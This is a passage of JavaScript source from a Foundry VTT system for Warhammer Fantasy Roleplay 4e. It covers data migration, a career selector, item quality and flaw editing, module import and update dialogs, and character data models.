            itemEffect.changes = oldChanges;
          }
          
          if (existingUpdate)
          {
            existingUpdate.effects.push(itemEffect);
          }
          else 
          {
            itemsUpdate.push({_id : item.id, effects : [itemEffect]});
          }
          
          deleteActorEffects.push(effect.id);
      }
      else if (effect.changes.length == 0 && (effect.scripts.length == 0 || effect.scripts.every(c => !c.trigger)))
      {
        deleteActorEffects.push(effect.id);
        console.log(`Deleting empty effect ${effect.name}`);
      }
    }
    if (update)
    {
      if (itemsUpdate.length)
      {
        await actor.update({items : itemsUpdate});
        console.log(itemsUpdate);
      }
      if (deleteActorEffects.length)
      {
        await actor.deleteEmbeddedDocuments("ActiveEffect", deleteActorEffects, {skipDeletingItems : true});
        console.log(deleteActorEffects);
      }
    }
  }

  static migrateJournalData(journal)
  {
    let updateData = {_id : journal.id, pages : []};

    for(let page of journal.pages)
    {
      let html = page.text.content;
      console.log(`Checking Journal Page HTML ${journal.name}.${page.name}`);
      let newHTML = this._migrateV10Links(html);

      if (html != newHTML)
      {
        updateData.pages.push({_id : page.id, "text.content" : newHTML});
      }
    }
    return updateData;
  }

  static migrateTableData(table)
  {
    let updateData = {_id : table.id, results : []};

    for(let result of table.results)
    {
      if (result.type == 0)
      {
        let html = result.text;
        let newHTML = this._migrateV10Links(html);

        if (html != newHTML)
        {
          updateData.results.push({_id : result.id, text : newHTML});
        }
      }

      else if (result.type == 2 && this.v10Conversions[result.documentCollection])
      {
        updateData.results.push({_id : result.id, documentCollection : this.v10Conversions[result.documentCollection]});
      }
    }
    return updateData;
  }

  /**
 * Migrate a single Actor entity to incorporate latest data model changes
 * Return an Object of updateData to be applied
 * @param {object} actor    The actor data object to update
 * @return {Object}         The updateData to apply
 */
  static async migrateOwnedItemEffects(actor) {

    let itemsToRemove = [];

    let itemsToAdd = [];

    for (let item of actor.items) {
      if (item.getFlag("core", "sourceId")) {
        let source = item.getFlag("core", "sourceId");
        let newItem = item.toObject();
        let sourceItem = await fromUuid(source);
        if (sourceItem)
          sourceItem = sourceItem.toObject();

        if (sourceItem.name == item.name) {
          newItem.effects = sourceItem.effects;
          itemsToRemove.push(item.id);
          itemsToAdd.push(newItem);
        }
      }
    }

    await actor.deleteEmbeddedDocuments("Item", itemsToRemove);
    await actor.createEmbeddedDocuments("Item", itemsToAdd, { keepId: true });

    console.log(`Replaced Items ${itemsToAdd.map(i => i.name).join(", ")} for actor ${actor.name}`);
  };


  /* -------------------------------------------- */


  /**
   * Scrub an Actor's system data, removing all keys which are not explicitly defined in the system template
   * @param {Object} actorData    The data object for an Actor
   * @return {Object}             The scrubbed Actor data
   */
  static cleanActorData(actorData) {

    // Scrub system data
    const model = game.system.model.Actor[actorData.type];
    actorData.data = foundry.utils.filterObject(actorData.data, model);

    // Scrub system flags
    const allowedFlags = CONFIG.wfrp4e.allowedActorFlags.reduce((obj, f) => {
      obj[f] = null;
      return obj;
    }, {});
    if (actorData.flags.wfrp4e) {
      actorData.flags.wfrp4e = foundry.utils.filterObject(actorData.flags.wfrp4e, allowedFlags);
    }

    // Return the scrubbed data
    return actorData;
  }


/* -------------------------------------------- */

  /**
   * Migrate a single Item entity to incorporate latest data model changes
   *
   * @param {object} item  Item data to migrate
   * @return {object}      The updateData to apply
   */
   static migrateArmourData(item) {
    let updateData = {};

      foundry.utils.mergeObject(updateData, this.migrateProperties(item));

    return updateData;
  };

     static migrateWeaponData(item) {
      let updateData = {};

      foundry.utils.mergeObject(updateData, this.migrateProperties(item));
      return updateData;
    };

    static migrateAmmoData(item) {
      let updateData = {};

      foundry.utils.mergeObject(updateData, this.migrateProperties(item));
      return updateData;
    };

    static migrateProperties(item)
    {
      let updateData = {};
      if (typeof item.system.qualities.value == "string")
      {
        let allQualities = WFRP_Utility.qualityList();
        updateData["system.qualities.value"] = item.system.qualities.value.split(",").map(i => i.trim()).map(i => {return {name : WFRP_Utility.findKey(i.split(" ")[0], allQualities), value : Number(i.split(" ")[1]) }}).filter(i => i.name);
      }
      if (typeof item.system.flaws.value == "string")
      {
        let allFlaws = WFRP_Utility.flawList();
        updateData["system.flaws.value"] = item.system.flaws.value.split(",").map(i => i.trim()).map(i => {return {name : WFRP_Utility.findKey(i.split(" ")[0], allFlaws), value : Number(i.split(" ")[1])}}).filter(i => i.name);
      }
      return updateData;
    }


  /**
   * Migrate a single Item entity to incorporate latest data model changes
   *
   * @param {object} item  Item data to migrate
   * @return {object}      The updateData to apply
   */
  static migrateItemData(item) {
    let updateData = {};

    if (item.type == "armour")
    {
      updateData = Migration.migrateArmourData(item);
    }

    if (item.type == "weapon")
    {
      updateData = Migration.migrateWeaponData(item);
    }

    if (item.type == "ammunition")
    {
      updateData = Migration.migrateAmmoData(item);
    }
    
    if (item.type == "spell")
    {
      if (typeof item.system.lore.effect == "string")
      {
        updateData["system.lore.effectString"] = item.system.lore.effect;
      }
    }

    if (item.type == "trait" && !item.system.disabled)
    {
      updateData["system.disabled"] = item.actor?.system?.excludedTraits?.includes(item.id) || false;
    }

    
    let newDescription = this._migrateV10Links(item.system.description.value);
    let newGMDescription = this._migrateV10Links(item.system.gmdescription.value);

    if (item.system.description.value != newDescription)
    {
      updateData["system.description.value"] = newDescription;
    }

    if (item.system.gmdescription.value != newGMDescription)
    {
      updateData["system.gmdescription.value"] = newGMDescription;
    }

    // Migrate Effects
    if (item.effects) {
      const effects = item.effects.reduce((arr, e) => {

        let effectUpdate = Migration.migrateEffectData(e);

        // Update the Owned Item
        if (!foundry.utils.isEmpty(effectUpdate)) {
          effectUpdate._id = e.id;
          arr.push(expandObject(effectUpdate));
        }

        return arr;
      }, []);
      if (effects.length > 0) updateData.effects = effects;
    }

    if (!foundry.utils.isEmpty(updateData))
      // console.log("Migration data for " + item.name, updateData)
    return updateData;
  };

  static removeLoreEffects(docData)
  {
    let loreEffects = (docData.effects || []).filter(i => i.flags.wfrp4e?.lore);
    if (loreEffects.length)
    {
      WFRP_Utility.log("Removing lore effects for " + docData.name, true, loreEffects);
      // return document.deleteEmbeddedDocuments("ActiveEffect", loreEffects.map(i => i.id));
    }
    return docData.effects?.filter(e => !loreEffects.find(le => le._id == e._id)) || [];
  }

  /* -------------------------------------------- */

  /**
   * Migrate a single Effect entity to incorporate latest data model changes
   *
   * @param {object} effect Effect data to migrate
   * @return {object}      The updateData to apply
   */
  static migrateEffectData(effect) {
    let updateData = {};
    Migration._migrateEffectScript(effect, updateData);
    if (!foundry.utils.isEmpty(updateData))
      // console.log("Migration data for " + effect.name, updateData)
    return updateData;
  };

  /* -------------------------------------------- */

  /**
   * Migrate a single Scene entity to incorporate changes to the data model of it's actor data overrides
   * Return an Object of updateData to be applied
   * @param {Object} scene  The Scene data to Update
   * @return {Object}       The updateData to apply
   */
  static migrateSceneData(scene) {
    const tokens = scene.tokens.map(token => {
      const t = token.toJSON();
      if (!t.actorId || t.actorLink) {
        t.actorData = {};
      }
      else if (!game.actors.has(t.actorId)) {
        t.actorId = null;
        t.actorData = {};
      }
      else if (!t.actorLink) {
        const actorData = foundry.utils.duplicate(t.actorData);
        actorData.type = token.actor?.type;
        const update = Migration.migrateActorData(actorData);
        ['items', 'effects'].forEach(embeddedName => {
          if (!update[embeddedName]?.length) return;
          const updates = new Map(update[embeddedName].map(u => [u._id, u]));
          t.actorData[embeddedName].forEach(original => {
            const update = updates.get(original._id);
            if (update) foundry.utils.mergeObject(original, update);
          });
          delete update[embeddedName];
        });

        foundry.utils.mergeObject(t.actorData, update);
      }
      return t;
    });
    return { tokens };
  };

  /* -------------------------------------------- */
  /*  Low level migration utilities
  /* -------------------------------------------- */

  static _loreEffectIds(document)
  {
    return document.effects.filter(e => e.flags.wfrp4e?.lore).map(i => i.id)
  }

  static _migrateEffectScript(effect, updateData) {
    let script = effect.flags?.wfrp4e?.script;

    if (!script)
      return updateData


    script = script.replaceAll("actor.data.token", "actor.prototypeToken");
    script = script.replaceAll("actor.data", "actor");
    script = script.replaceAll("effect.label", "effect.name");
    script = this._migrateV10Links(script);


    if (script != effect.flags.wfrp4e.script)
      updateData["flags.wfrp4e.script"] = script;

    return updateData
  }
  
  static _migrateV10Links(html)
  {
    try 
    {
      if (!html) return html
      
      for(let key in this.v10Conversions)
      {
        let priorHTML = html;
        html = html.replaceAll(key, this.v10Conversions[key]);
        if (html != priorHTML)
        {
          console.log(`Replacing ${key} with ${this.v10Conversions[key]}`);
        }
      }
      return html;
    }
    catch (e)
    {
      console.error("Error replacing links: " + e);
    }
  }

  static v10Conversions = {
    "wfrp4e-core.journal-entries" : "wfrp4e-core.journals",
    "wfrp4e-core.maps" : "wfrp4e-core.scenes",
    "wfrp4e-core.bestiary" : "wfrp4e-core.actors",
    "wfrp4e-core.careers" : "wfrp4e-core.items",
    "wfrp4e-core.criticals" : "wfrp4e-core.items",
    "wfrp4e-core.skills" : "wfrp4e-core.items",
    "wfrp4e-core.talents" : "wfrp4e-core.items",
    "wfrp4e-core.traits" : "wfrp4e-core.items",
    "wfrp4e-core.psychologies" : "wfrp4e-core.items",
    "wfrp4e-core.mutations" : "wfrp4e-core.items",
    "wfrp4e-core.injuries" : "wfrp4e-core.items",
    "wfrp4e-core.diseases" : "wfrp4e-core.items",
    "wfrp4e-core.spells" : "wfrp4e-core.items",
    "wfrp4e-core.prayers" : "wfrp4e-core.items",
    "wfrp4e-core.trappings" : "wfrp4e-core.items",
    "wfrp4e-eis.mutations" : "wfrp4e-eis.items",
    "wfrp4e-eis.spells" : "wfrp4e-eis.items",
  }
}

class CareerSelector extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.id = "career-selector";
        options.template = "systems/wfrp4e/templates/apps/career-selector.hbs";
        options.height = 800;
        options.width = 400;
        options.minimizable = true;
        options.title = "Career Selector";
        return options;
    }

    constructor(app) {
        super(app);
        this.careers = [];
        this.currentCareer = this.object.currentCareer;
        this.selectedCareer = -1;
    }

    async _render(...args) {
        await super._render(...args);
    }

    async getData() {
        let data = await super.getData();
        if (this.careers.length == 0)
        {
            await this.loadCareers();
        }

        data.careers = this.careers;
        data.careerList = {};

        if (this.careers.length) {
            data.careerList = this.sortCareers();
        }
        return data
    }

    async loadCareers() {
        this.careers = [];
        this.careers = await game.wfrp4e.utility.findAll("career", game.i18n.localize("CAREER.Loading"));
        this.careers = this.careers.sort((a, b) => a.careergroup.value > b.careergroup.value ? 1 : -1);
        this.careers = this.careers.filter(i => (i.compendium && !i.compendium.private) || i.ownership > 2);
    }

    sortCareers() {
        let careerList = {
            inClass: {},
            outOfClass: {},
        };
        if (!this.careers.length)
            return careerList

        this.careers.forEach((tier, i) => {
            try {

                let data = { link: tier.link, level: tier.level.value, img: tier.img, name: tier.name, index: i };
                let type = "outOfClass";
                if (this.currentCareer && this.currentCareer.class.value == tier.class.value)
                    type = "inClass";

                if (careerList[type][tier.careergroup.value]?.length) {
                    if (!careerList[type][tier.careergroup.value].find(i => i.name == tier.name)) // avoid duplicates
                        careerList[type][tier.careergroup.value].push(data);
                }
                else
                    careerList[type][tier.careergroup.value] = [data];
            }
            catch (e) {
                ui.notifications.error(`Error when displaying ${tier.name}: ${e}`);
            }
        });

        for (let career in careerList.inClass)
            careerList.inClass[career] = careerList.inClass[career].sort((a, b) => a.level > b.level ? 1 : -1);
        for (let career in careerList.outOfClass)
            careerList.outOfClass[career] = careerList.outOfClass[career].sort((a, b) => a.level > b.level ? 1 : -1);

        return careerList
    }

    async _updateObject(event, formData) {
        await this.object.createEmbeddedDocuments("Item", [this.selectedCareer.toObject()]);
        let experience = foundry.utils.duplicate(this.object.details.experience);
        experience.spent += parseInt(formData.exp);
        experience.log = this.object._addToExpLog(formData.exp, `${game.i18n.format("LOG.CareerChange", { career: this.selectedCareer.name })}`, experience.spent, undefined);
        this.object.update({ "system.details.experience" : experience });
    }

    calculateMoveExp() {
        let exp = 0, reasons = [];
        if (!this.selectedCareer)
            return { exp }

        if (this.currentCareer)
        {
        exp += this.currentCareer.complete.value ? 100 : 200;

        reasons.push(this.currentCareer.complete.value ? game.i18n.localize("CAREER.LeaveComplete") : game.i18n.localize("CAREER.LeaveIncomplete"));




        if (this.selectedCareer.class.value != this.currentCareer.class.value) {
            exp += 100;
            reasons.push(game.i18n.localize("CAREER.DifferentClass"));
        }

        }
        else {
            exp += 100;
        }

        return { exp, tooltip: reasons.join(", ") }
    }

    activateListeners(html) {
        super.activateListeners(html);

        let input = html.find("input")[0];

        html.find(".career-tier").mousedown(ev => {
            if (ev.button == 0) {
                html.find(".career-tier.active").each(function () {
                    $(this).removeClass("active");
                });
                $(ev.currentTarget).toggleClass("active");
                this.selectedCareer = this.careers[Number($(ev.currentTarget).attr("data-index"))];
                let { exp, tooltip } = this.calculateMoveExp();
                input.value = exp;
                input.setAttribute("title", tooltip);
            }
            else if (ev.button == 2) {
                this.careers[Number($(ev.currentTarget).attr("data-index"))].sheet.render(true);
            }
        });
    }



}

class TagManager  {
  createTags()
  {
    this.tags = {};
    Array.from(game.packs.keys()).forEach(packKey => {
      this.tags[packKey] = this.findTagsFromIndex(game.packs.get(packKey).index);
    });
  }

  findTagsFromIndex(index)
  {
    let tags = [];
    index.forEach(i => {
      if (!tags.includes(i.type))
        tags.push(i.type);
    });
    return tags
  }

  getPacksWithTag(tags)
  {

    if (!tags || tags.length == 0)
      return Object.keys(this.tags).map(k => game.packs.get(k))

    if (!Array.isArray(tags))
      tags = [tags];
    
    let keys = [];

    for(let key in this.tags)
      if (this.tags[key].some(t => tags.includes(t)))
        keys.push(key);

    return keys.map(k => game.packs.get(k))
  }

}

class ItemProperties extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.id = "item-properties";
        options.template = "systems/wfrp4e/templates/apps/item-properties.hbs";
        options.height = "auto";
        options.width = 400;
        options.minimizable = true;
        options.title = "Item Properties";
        return options;
    }

    constructor(...args) {
        super(...args);

        if (ItemProperties.hasWeaponProperties(this.object)) {
            this.qualities = foundry.utils.deepClone(game.wfrp4e.config.weaponQualities);
            this.flaws = foundry.utils.deepClone(game.wfrp4e.config.weaponFlaws);
        } else if (ItemProperties.hasArmourProperties(this.object)) {
            this.qualities = foundry.utils.deepClone(game.wfrp4e.config.armorQualities);
            this.flaws = foundry.utils.deepClone(game.wfrp4e.config.armorFlaws);
        } else {
            this.qualities = {};
            this.flaws = {};
        }

        foundry.utils.mergeObject(this.qualities, game.wfrp4e.config.itemQualities);
        foundry.utils.mergeObject(this.flaws, game.wfrp4e.config.itemFlaws);

        if (this.object.type === "trait") {
            ui.notifications.warn(game.i18n.localize("PROPERTIES.TraitWarning"));
        }
    }

    static hasWeaponProperties(object) {
        switch (object.type) {
            case 'weapon':
            case 'ammunition':
                return true;
            case 'trait':
                return object.system.rollable.value;
            default:
                return false;
        }
    }

    static hasArmourProperties(object) {
        switch (object.type) {
            case 'armour':
                return true;
            case 'trait':
                return !object.system.rollable.value;
            default:
                return false;
        }
    }

    getData() {
        let data = super.getData();

        data.qualities = Object.keys(this.qualities).map(i => {
            return {
                name: this.qualities[i],
                hasValue: game.wfrp4e.config.propertyHasValue[i],
                key: i,
                existing: this.object.originalProperties.qualities[i],
            }
        });

        data.flaws = Object.keys(this.flaws).map(i => {
            return {
                name: this.flaws[i],
                hasValue: game.wfrp4e.config.propertyHasValue[i],
                key: i,
                existing: this.object.originalProperties.flaws[i],
            }
        });

        data.customQualities = this.object.qualities.value.filter(i => i.custom).map(i => `${i.name} ${i.value ? "(" + i.value + ")" : ""}: ${i.description}`).join(" | ");
        data.customFlaws = this.object.flaws.value.filter(i => i.custom).map(i => `${i.name} ${i.value ? "(" + i.value + ")" : ""}: ${i.description}`).join(" | ");

        return data
    }


    async _updateObject(event, formData) {

        let qualities = [];
        let flaws = [];
        let groups = [];

        for (let prop in formData) {

            if (prop == "custom-quality")
                qualities = qualities.concat(this.parseCustomProperty(formData[prop]));
            else if (prop == "custom-flaw")
                flaws = flaws.concat(this.parseCustomProperty(formData[prop]));

            if (formData[prop] && !prop.includes("-value")) {
                let property = {
                    name: prop,
                    value: null
                };
                if (formData[`${prop}-value`]) {
                    let value = formData[`${prop}-value`];
                    if (Number.isNumeric(value))
                        value = parseInt(value);
                    property.value = value;
                }

                if (formData[`${prop}-group`]) 
                {
                    property.group = formData[`${prop}-group`];
                    groups.push(property.group);
                }

                if (this.qualities[prop])
                    qualities.push(property);
                else if (this.flaws[prop])
                    flaws.push(property);
            }
        }


        // Find the first quality for each group, arbitrarily set that to be the active
        // Hack or Impale or Defensive -> Hack is default active
        for(let groupNum of groups)
        {
            let first = qualities.find(q => q.group == groupNum);
            if (first) first.active = true;
        }

        WFRP_Utility.log("Updating Qualities/Flaws", false, formData, qualities, flaws);
        this.object.update({ "system.qualities.value": qualities, "system.flaws.value": flaws });
    }

    parseCustomProperty(string)
    {
        let regex = /(.+?)(\((.+?)\))*\s*:(.+?)(\||$)/gm;

        let matches = string.matchAll(regex);
        let traits = [];

        for (let match of matches)
        {
            traits.push({
                key : match[1].trim().slugify(),
                custom : true,
                value : match[3],
                name : match[1].trim(),
                display : (match[1].trim() + ` ${match[3] ? match[3] : ""}`).trim(),
                description : match[4].trim()
            });
        }

        return traits
    }


    activateListeners(html) {
        super.activateListeners(html);
        

        html.find(".property-input").change(ev => {
            let property = ev.target.classList[1];
            let checked = ev.target.value ? true : false;
            let element = $(ev.currentTarget).parents("form").find(`[name=${property}]`)[0];
            if (element)
                element.checked = checked;

        });
    }



}

class ModuleUpdater extends Dialog {

    constructor(module, html) 
    {

        super({
            title: `${game.i18n.format("UpdaterTitle", {title : module.title})}`,
            content: html,
            module,
            buttons:
            {
              update:
              {
                label: game.i18n.localize("Update"),
                callback: html => {
                    if (!game.settings.get(module.id, "initialized"))
                        return ui.notifications.notify(game.i18n.localize("UPDATER.Error"))
                    let settings = this.getUpdateSettings(html);
                    this.updateImportedContent(settings);
                }
              }
            },
            default: "update"
          });
    }

    static async create(module)
    {
        let html = await renderTemplate("systems/wfrp4e/templates/apps/module-updater.hbs", module);

        return new this(module, html)
    }

    getUpdateSettings(html)
    {
        let updateSettings = {};
        updateSettings.actors = html.find('[name="actors"]').is(':checked');
        updateSettings.journals = html.find('[name="journals"]').is(':checked');
        updateSettings.items = html.find('[name="items"]').is(':checked');
        updateSettings.scenes = html.find('[name="scenes"]').is(':checked');
        updateSettings.tables = html.find('[name="tables"]').is(':checked');
        updateSettings.excludeNameChange = html.find('[name="excludeNameChange"]').is(':checked');
        return updateSettings
    }

    async updateImportedContent(settings)
    {
        let documents = await this.getDocuments();
        this.count = {created : 0, updated : 0};
        for(let type in settings)
        {
            if (type != "excludeNameChange" && settings[type])
                await this.updateDocuments(documents[type], settings);
        }
        ui.notifications.notify(`${game.i18n.format("UPDATER.Notification", { created: this.count.created,  updated: this.count.updated,  name: this.data.module.id, version: this.data.module.version })}`);

    }

    async updateDocuments(documents, settings)
    {
        if (!documents.length)
            return
        let toCreate = [];
        let toDelete = [];
        let documentClass;
        for (let document of documents)
        {
            if (document?.type == "character")
            {
                continue;
            }

            if (!documentClass)
                documentClass = CONFIG[document.documentName].documentClass;
            if (game[document.collectionName].has(document.id))
            {
                let existingDoc = game[document.collectionName].get(document.id);
                if (!settings.excludeNameChange || (settings.excludeNameChange && document.name == existingDoc.name))
                {
                    let folder = existingDoc.folder;
                    let ownership = existingDoc.ownership;
                    toDelete.push(existingDoc.id);
                    let newDoc = document.toObject();
                    newDoc.folder = folder;
                    newDoc.ownership = ownership;
                    toCreate.push(newDoc);
                    game.wfrp4e.utility.log(`Updated Document ${document.name}`);
                    this.count.updated++;
                }
            }
            else 
            {
                let folder = document.getFlag(this.data.module.id, "initialization-folder");
                folder = game.folders.getName(folder);
                let newDoc = document.toObject();
                if (folder)
                    newDoc.folder = folder.id;
                toCreate.push(newDoc);
                game.wfrp4e.utility.log(`Imported Document ${document.name}`);
                this.count.created++;
            }
        }
        await documentClass.deleteDocuments(toDelete);
        let created = await documentClass.createDocuments(toCreate);

        if (documentClass.name == "Scene")
        {
            created.forEach(async s => {
                let thumb = await s.createThumbnail();
                s.update({ "thumb": thumb.thumb });
            });
        }
    }

    async getDocuments()
    {
        let module = this.data.module;
        let packs = module.flags.initializationPacks.map(i => game.packs.get(i));
        let documents = {
            actors : [],
            journals : [],
            items : [],
            scenes : [],
            tables : [],
        };
        for (let pack of packs)
        {
            let docs = await pack.getDocuments();
            switch (pack.metadata.type)
            {
                case "Actor": documents.actors = documents.actors.concat(docs);
                    break;
                case "JournalEntry": documents.journals = documents.journals.concat(docs);
                    break;
                case "Item": documents.items = documents.items.concat(docs);
                    break;
                case "RollTable": documents.tables = documents.tables.concat(docs);
                    break;
                case "Scene": documents.scenes = documents.scenes.concat(docs);
                    break;
            }
        }
        return documents
    }
}

class ModuleInitializer extends Dialog {

    constructor(module, title, html) {
        super({
            title: title,
            content: html,
            module: game.modules.get(module),
            buttons: {
                initialize: {
                    label: "Initialize",
                    callback: async () => {
                        game.settings.set(module, "initialized", true);
                        await this.initialize();
                        ui.notifications.notify(game.modules.get(module).title + ": Initialization Complete");
                    }
                },
                update: {
                    label: "Update",
                    condition : game.settings.get(module, "initialized"),
                    callback: async () => {
                        let updater = await game.wfrp4e.apps.ModuleUpdater.create(game.modules.get(module), this);
                        updater.render(true);
                    }
                },
                delete : {
                    label: "Delete",
                    condition : game.settings.get(module, "initialized"),
                    callback: async () => {
                        this.deleteModuleContent(module);
                    }
                },
                no: {
                    label: "No",
                    callback: () => {
                        game.settings.set(module, "initialized", true);
                        ui.notifications.notify("Skipped Initialization.");
                    }
                }
            }
        });
    }

    rootFolders = {}

    async initialize() {

        let packList = this.data.module.flags.initializationPacks;

        for (let pack of packList.map(p => game.packs.get(p))) 
        {
            await this.createFolders(pack);
            let documents = await pack.getDocuments();
            try {
            switch (documents[0].documentName) {
                case "Actor":
                    ui.notifications.notify(this.data.module.title + ": Initializing Actors");
                    await this.createOrUpdateDocuments(documents, game.actors);
                    break;
                case "Item":
                    ui.notifications.notify(this.data.module.title + ": Initializing Items");
                    await this.createOrUpdateDocuments(documents, game.items);
                    break;
                case "JournalEntry":
                    ui.notifications.notify(this.data.module.title + ": Initializing Journals");
                    await this.createOrUpdateDocuments(documents, game.journal);
                    break;
                case "RollTable":
                    ui.notifications.notify(this.data.module.title + ": Initializing Tables");
                    await this.createOrUpdateDocuments(documents, game.tables);
                    break;
                case "Scene":
                    ui.notifications.notify(this.data.module.title + ": Initializing Scenes");
                    await this.createOrUpdateDocuments(documents, game.scenes);
                    break;
                }
            }
            catch(e)
            {
                console.error(e);
            }

        }
    }

    createFolders(pack)
    {
        let root = game.modules.get(pack.metadata.packageName).flags.folder;
        root.type = pack.metadata.type;
        root._id = foundry.utils.randomID();
        let packFolders = pack.folders.contents.map(f => f.toObject());
        for(let f of packFolders)
        {
            if (!f.folder)
            {
                f.folder = root._id;
            }
        }
        this.rootFolders[pack.metadata.id] = root._id;
        return Folder.create(packFolders.concat(root), {keepId : true})
    }

    async createOrUpdateDocuments(documents, collection, )
    {
        let existingDocuments = documents.filter(i => collection.has(i.id));
        let newDocuments = documents.filter(i => !collection.has(i.id));
        await collection.documentClass.create(this._addFolder(newDocuments));
        if (existingDocuments.length)
        {
            game.wfrp4e.utility.log("Pre Existing Documents: ", null, {args : existingDocuments});
            existingDocuments = await new Promise(resolve => new ModuleDocumentResolver(existingDocuments, {resolve}).render(true));
            game.wfrp4e.utility.log("Post Existing Documents: ", null, {args : existingDocuments});
        }
        this._addFolder(existingDocuments);
        for (let doc of existingDocuments)
        {
            let existing = collection.get(doc.id);
            await existing.update(doc.toObject());
            ui.notifications.notify(`Updated existing document ${doc.name}`);
        }
    }

    _addFolder(documents)
    {
        return documents.map(d => {
            if (!d.folder)
            {
                d.updateSource({folder : this.rootFolders[d.pack]});
            }
            return d;
        })
    }

    async deleteModuleContent(id)
    {
        let proceed = await Dialog.confirm({
            title : game.i18n.localize("UPDATER.DeleteModuleContent"),
            content : game.i18n.format("UPDATER.DeleteModuleContentPrompt", {id}),
            yes : () => {return true},
            no : () => {return false},
        });
        if (proceed)
        {
            ui.notifications.notify(this.data.module.title + ": Deleting Scenes");
            let moduleScenes = game.scenes.filter(doc => doc.flags[id]);
            moduleScenes.forEach(doc => {
                doc.folder?.folder?.delete();
                doc.folder?.delete();});
            Scene.deleteDocuments(moduleScenes.map(doc => doc.id));

            ui.notifications.notify(this.data.module.title + ": Deleting Actors");
            let moduleActors = game.actors.filter(doc => doc.flags[id] && !doc.hasPlayerOwner);
            moduleActors.forEach(doc => {
                doc.folder?.folder?.delete();
                doc.folder?.delete();});
            Actor.deleteDocuments(moduleActors.map(doc => doc.id));

            ui.notifications.notify(this.data.module.title + ": Deleting Items");
            let moduleItems = game.items.filter(doc => doc.flags[id]);
            moduleItems.forEach(doc => {
                doc.folder?.folder?.delete();
                doc.folder?.delete();});
            Item.deleteDocuments(moduleItems.map(doc => doc.id));

            ui.notifications.notify(this.data.module.title + ": Deleting Journals");
            let moduleJournals = game.journal.filter(doc => doc.flags[id]);
            moduleJournals.forEach(doc => {
                doc.folder?.folder?.delete();
                doc.folder?.delete();});
            JournalEntry.deleteDocuments(moduleJournals.map(doc => doc.id));

            ui.notifications.notify(this.data.module.title + ": Deleting Tables");
            let moduleTables = game.tables.filter(doc => doc.flags[id]);
            moduleTables.forEach(doc => {
                doc.folder?.folder?.delete();
                doc.folder?.delete();});
            RollTable.deleteDocuments(moduleTables.map(doc => doc.id));
        }
    }
}


class ModuleDocumentResolver extends FormApplication
{
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.resizable = true;
        options.height = 600;
        options.width = 400;
        options.template = "systems/wfrp4e/templates/apps/document-resolver.hbs";
        options.classes.push("document-resolver");
        options.title = game.i18n.localize("INIT.ResolveDuplicates");
        return options;
    }


    _updateObject(ev, formData)
    {   
        this.options.resolve(this.object.filter(i => formData[i.id]));
    }
}

class WFRPTableConfig extends RollTableConfig {

    static get defaultOptions() {
        return foundry.utils.mergeObject(super.defaultOptions, {width: 725})
    }

    activateListeners(html) 
    {
        super.activateListeners(html);

        html.prepend($(`<div class="form-group">
            <label>${game.i18n.localize("TABLE.Key")}</label>
            <input type="text" name="flags.wfrp4e.key" value="${this.object.flags.wfrp4e?.key || ""}"/>
            <label>${game.i18n.localize("TABLE.Column")}</label>
            <input type="text" name="flags.wfrp4e.column" value="${this.object.flags.wfrp4e?.column || ""}"/>
        </div>`));
    }
}

class ValueDialog extends Dialog 
{
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.resizable = true;
        options.classes.push("value-dialog");
        return options;
    }


    static create(text, title, defaultValue = "", values={})
    {


        // If values is an array, convert to an Object that has keys and values
        if (Array.isArray(values))
        {
            let valuesObject = {};
            values.forEach(v => {
                valuesObject[v] = v;
            });
            values = valuesObject;
        }

        // If values object provided, show a select box, otherwise, just a text input
        let content = foundry.utils.isEmpty(values) ? 
        `<div class="value-dialog"><p>${text || "Enter Value"}</p><input class="value" type="text" value="${defaultValue}"></div>` 
        : 
        `<div class="value-dialog"><p>${text || "Select Value"}</p><select class="value" value="${defaultValue}"><option value=""></option>${Object.keys(values).map(
            v => `<option value=${v}>
                        ${typeof values[v] == "string" ? values[v] : v }
                  </option>`)}
                </select></div>`; 
        


            return Dialog.wait({
                title : title || "Value Dialog",
                content : content,
                buttons : {
                    submit : {
                        label : game.i18n.localize("Submit"),
                        callback: (html) => {
                            return html.find(".value")[0]?.value;
                        }
                    }                
                },
                default: "submit",
                close : () => {
                    return null
                }
            })
    }
}

class WFRPJournalTextPageSheet extends JournalTextPageSheet {

    async getData() {
        let data = await super.getData();
        data.headingLevels[4] = "Level 4";
        return data
    }
}


Hooks.on("init", () => {
    // Extend buildTOC to not include headers that have the `no-toc` class

    let buildTOC = JournalEntryPage.buildTOC;

    JournalEntryPage.buildTOC = function(html) {
        let toc = buildTOC.bind(this)(html);
        for(let slug in toc)
        {
            if (toc[slug].element.classList.contains("no-toc"))
                delete toc[slug];
        }
        return toc
    };

    
});

let fields$z = foundry.data.fields;

class CharacteristicsModel extends foundry.abstract.DataModel 
{
    static defineSchema() 
    {
        let schema = {};
        schema.ws = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.bs = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.s = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.t = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.i = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.ag = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.dex = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.int = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.wp = new fields$z.EmbeddedDataField(CharacteristicModel);
        schema.fel = new fields$z.EmbeddedDataField(CharacteristicModel);
        return schema;
    }


    compute() 
    {
        for(let ch in this)
        {
            this[ch].computeValue();
            this[ch].computeBonus();
            this[ch].computeCost();
        }
    }
}

class CharacteristicModel extends foundry.abstract.DataModel
{
    static defineSchema() 
    {
        let schema = {};
        schema.initial = new fields$z.NumberField({initial : 20});
        schema.modifier = new fields$z.NumberField({initial : 0});
        schema.advances = new fields$z.NumberField({initial : 0});
        schema.bonusMod = new fields$z.NumberField({initial : 0});
        schema.calculationBonusModifier = new fields$z.NumberField({initial : 0});
        return schema;
    }


    computeValue() 
    {
        this.value = this.initial + this.modifier + this.advances;
    }

    computeBonus() 
    {
        this.bonus = Math.floor(this.value / 10) + this.bonusMod;
    }

    computeCost()
    {
        this.cost = WFRP_Utility._calculateAdvCost(this.advances, "characteristic");
    }
}

let fields$y = foundry.data.fields;

class MountModel extends foundry.abstract.DataModel 
{
    static defineSchema() 
    {
        return {
            id : new fields$y.StringField({initial : ""}),
